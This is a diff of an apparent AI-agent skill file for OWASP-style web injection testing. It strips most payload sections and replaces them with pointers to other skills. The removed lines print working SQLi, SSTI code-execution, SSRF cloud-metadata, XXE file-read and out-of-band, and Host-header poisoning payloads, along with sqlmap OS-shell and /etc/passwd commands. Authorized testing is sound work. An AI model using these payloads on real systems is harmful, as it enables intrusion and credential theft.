@@ -2,6 +2,8 @@
 name: wstg-injection
 description: Use when testing input handling on a web target for injection classes — SQLi, XSS, SSTI, SSRF, command injection, XXE.
 metadata:
+  acordia:
+    family: web-methodology
   cyberstrike:
     source: .cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-injection/SKILL.md
     commit: 359655518
@@ -11,96 +13,7 @@ metadata:
 
 ## SQL Injection
 
-### Detection Payloads (test in every input)
-
-```sql
-'
-''
-' OR '1'='1
-' OR '1'='1' --
-' OR '1'='1' #
-" OR "1"="1" --
-' AND 1=1 --
-' AND 1=2 --
-1' ORDER BY 1 --
-1' ORDER BY 100 --
-' UNION SELECT NULL --
-```
-
-### DB Fingerprinting (from error messages)
-
-| Error Snippet                                     | Database   |
-| -------------------------------------------------- | ---------- |
-| `You have an error in your SQL syntax`            | MySQL      |
-| `pg_query()`, `PSQLException`                     | PostgreSQL |
-| `Microsoft SQL Server`, `Unclosed quotation mark` | MSSQL      |
-| `ORA-`, `Oracle error`                            | Oracle     |
-| `SQLite`                                          | SQLite     |
-
-### Union-Based Extraction
-
-```sql
--- Step 1: Find column count
-' ORDER BY 1 -- ... ' ORDER BY N --
-' UNION SELECT NULL,NULL,... --
-
--- Step 2: Find displayable column
-' UNION SELECT 'a',NULL,NULL --
-
--- Step 3: Extract data
--- MySQL:
-' UNION SELECT table_name,NULL FROM information_schema.tables --
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
-' UNION SELECT username,password FROM users --
-
--- MSSQL:
-' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U' --
-
--- PostgreSQL:
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' --
-```
-
-### Blind SQLi
-
-```sql
--- Boolean-based
-' AND 1=1 --  (true response)
-' AND 1=2 --  (false response)
-' AND SUBSTRING(username,1,1)='a' --
-' AND (SELECT COUNT(*) FROM users)>0 --
-
--- Time-based
-' AND SLEEP(5) --                        (MySQL)
-'; WAITFOR DELAY '0:0:5' --              (MSSQL)
-' AND pg_sleep(5) --                     (PostgreSQL)
-' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- (Oracle)
-```
-
-### sqlmap Quick Reference
-
-```bash
-# Basic scan
-sqlmap -u "https://TARGET/page?id=1" --batch --random-agent
-
-# POST request
-sqlmap -u "https://TARGET/login" --data="user=admin&pass=test" -p user --batch
-
-# With authentication
-sqlmap -u "https://TARGET/page?id=1" --cookie="session=abc123" --batch
-
-# Enumerate
-sqlmap -u "URL" --dbs                    # List databases
-sqlmap -u "URL" -D dbname --tables       # List tables
-sqlmap -u "URL" -D db -T users --dump    # Dump table
-sqlmap -u "URL" --current-user           # Current DB user
-sqlmap -u "URL" --is-dba                 # Check DBA privs
-
-# Advanced
-sqlmap -u "URL" --os-shell               # OS shell
-sqlmap -u "URL" --file-read=/etc/passwd  # Read files
-sqlmap -u "URL" --tamper=space2comment,between  # WAF bypass
-sqlmap -u "URL" --level=5 --risk=3       # Thorough scan
-```
+SQL injection → see `attack-sqli`.
 
 ## Cross-Site Scripting (XSS)
 
@@ -219,114 +132,15 @@ c\at /etc/passwd
 
 ## Server-Side Template Injection (SSTI)
 
-### Detection Polyglot
-
-```
-${{<%[%'"}}%\.
-{{7*7}}
-${7*7}
-<%= 7*7 %>
-#{7*7}
-*{7*7}
-```
-
-### Engine-Specific Payloads
-
-| Engine            | Detection         | RCE Payload                                                                                            |
-| ----------------- | ----------------- | ------------------------------------------------------------------------------------------------------ | ------ | --------------- |
-| Jinja2 (Python)   | `{{7*7}}` → 49    | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`                                   |
-| Twig (PHP)        | `{{7*7}}` → 49    | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`                 |
-| Freemarker (Java) | `${7*7}` → 49     | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`                                  |
-| Pebble (Java)     | `{{7*7}}` → 49    | `{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}` |
-| ERB (Ruby)        | `<%= 7*7 %>` → 49 | `<%= system("id") %>`                                                                                  |
-| Smarty (PHP)      | `{7*7}` → 49      | `{system('id')}`                                                                                       |
-| Handlebars (JS)   | `{{this}}`        | `{{#with "s" as                                                                                        | string | }}...{{/with}}` |
+Server-side template injection → see `attack-ssti`.
 
 ## Server-Side Request Forgery (SSRF)
 
-### Internal Target URLs
-
-```
-http://127.0.0.1
-http://localhost
-http://0.0.0.0
-http://[::1]
-http://0x7f000001
-http://2130706433  (decimal)
-http://017700000001  (octal)
-http://127.1
-```
-
-### Cloud Metadata Endpoints
-
-```
-# AWS
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/user-data/
-
-# GCP
-http://metadata.google.internal/computeMetadata/v1/
-(Header: Metadata-Flavor: Google)
-
-# Azure
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-(Header: Metadata: true)
-
-# DigitalOcean
-http://169.254.169.254/metadata/v1/
-```
-
-### SSRF Bypass Techniques
-
-```
-# URL encoding
-http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
-
-# DNS rebinding
-Register DNS: evil.com → 169.254.169.254
-
-# Redirect bypass
-http://evil.com/redirect?url=http://169.254.169.254
-
-# Protocol smuggling
-gopher://127.0.0.1:6379/_SET%20key%20value
-dict://127.0.0.1:6379/SET:key:value
-```
+Server-side request forgery → see `attack-ssrf`.
 
 ## XML External Entity (XXE)
 
-### Basic XXE
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root><data>&xxe;</data></root>
-```
-
-### Blind XXE (OOB via HTTP)
-
-```xml
-<!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://COLLAB_SERVER/xxe">
-  %xxe;
-]>
-```
-
-### XXE via File Upload
-
-Test in: SVG images, DOCX/XLSX/PPTX (unzip, inject in XML), SOAP requests, RSS feeds.
-
-```xml
-<!-- SVG XXE -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <text x="0" y="16">&xxe;</text>
-</svg>
-```
+XML external entity injection → see `attack-xxe`.
 
 ## LFI / Path Traversal
 
@@ -354,19 +168,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
 
 ## Host Header Injection
 
-```bash
-# Basic
-curl -H "Host: evil.com" https://TARGET/
-
-# X-Forwarded-Host
-curl -H "X-Forwarded-Host: evil.com" https://TARGET/
-
-# Password reset poisoning
-curl -X POST https://TARGET/forgot-password \
-  -H "Host: evil.com" \
-  -d "email=victim@target.com"
-# Check if reset link uses evil.com
-```
+Host header injection → see `attack-host-header`.
 
 ## HTTP Parameter Pollution
 
